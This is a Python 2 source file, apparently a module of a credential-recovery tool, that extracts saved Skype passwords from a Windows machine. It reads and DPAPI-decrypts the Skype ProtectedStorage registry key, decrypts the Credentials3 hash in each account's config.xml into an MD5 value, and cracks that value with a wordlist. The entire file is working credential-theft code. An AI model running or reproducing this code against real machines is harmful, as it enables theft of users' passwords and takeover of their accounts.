from Crypto.Cipher import AES
import xml.etree.cElementTree as ET
import win32con, win32api, win32crypt
import base64, hashlib, os
import binascii, struct
from dico import get_dico

class Skype():
	def aes_encrypt(self, message, passphrase):
		IV = '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
		aes = AES.new(passphrase, AES.MODE_CBC, IV)
		return aes.encrypt(message)

	# get value used to build the salt
	def get_regkey(self):
		try:
			accessRead = win32con.KEY_READ | win32con.KEY_ENUMERATE_SUB_KEYS | win32con.KEY_QUERY_VALUE
			keyPath = 'Software\\Skype\\ProtectedStorage'
			
			try:
				hkey = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, keyPath, 0, accessRead)
			except Exception,e:
				return ''
			
			num = win32api.RegQueryInfoKey(hkey)[1]
			k = win32api.RegEnumValue(hkey, 0)
			
			if k:
				key = k[1]
				return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1] 
		except Exception,e:
			return 'failed'
			
	# get hash from configuration file
	def get_hash_credential(self, xml_file):
		tree = ET.ElementTree(file=xml_file)
		encrypted_hash = tree.find('Lib/Account/Credentials3')
		
		if encrypted_hash != None:
			return encrypted_hash.text
		else:
			return 'failed'
	
	# decrypt hash to get the md5 to bruteforce
	def get_md5_hash(self, enc_hex, key):
		# convert hash from hex to binary
		enc_binary = binascii.unhexlify(enc_hex)

		# retrieve the salt
		salt =  hashlib.sha1('\x00\x00\x00\x00' + key).digest() + hashlib.sha1('\x00\x00\x00\x01' + key).digest()

		# encrypt value used with the XOR operation
		aes_key = self.aes_encrypt(struct.pack('I', 0) * 4, salt[0:32])[0:16]

		# XOR operation
		decrypted = []
		for d in range(16):
			decrypted.append(struct.unpack('B', enc_binary[d])[0] ^ struct.unpack('B', aes_key[d])[0])

		# cast the result byte
		tmp = ''
		for dec in decrypted:
			tmp = tmp + struct.pack(">I", dec).strip('\x00')

		# byte to hex 
		return binascii.hexlify(tmp)
	
	def dictionary_attack(self, login, md5):
		wordlist = get_dico()
		
		for word in wordlist:
			hash = hashlib.md5('%s\nskyper\n%s' % (login, word)).hexdigest()
			if hash == md5:
				return word
		return False
	
	# main function
	def run(self):
		
		if 'APPDATA' in os.environ:
			directory = os.environ['APPDATA'] + '\Skype'
			
			if os.path.exists(directory):
				# retrieve the key used to build the salt
				key = self.get_regkey()
				if key != 'failed':
					pwdFound = []
					for d in os.listdir(directory):
						if os.path.exists(directory + os.sep + d + os.sep + 'config.xml'):
							values = {}
							
							try:
								values['username'] = d
								
								# get encrypted hash from the config file
								enc_hex = self.get_hash_credential(directory + os.sep + d + os.sep + 'config.xml')
								
								if enc_hex != 'failed':
									# decrypt the hash to get the md5 to brue force
									values['hash_md5'] = self.get_md5_hash(enc_hex, key)
									values['shema to bruteforce'] = values['username'] + '\\nskyper\\n<password>'
									values['Category'] = "Skype"

									# Try a dictionary attack on the hash
									password = self.dictionary_attack(values['username'], values['hash_md5'])
									if password:
										values['password'] = password

									pwdFound.append(values)
							except Exception,e:
								pass
					
					return pwdFound
			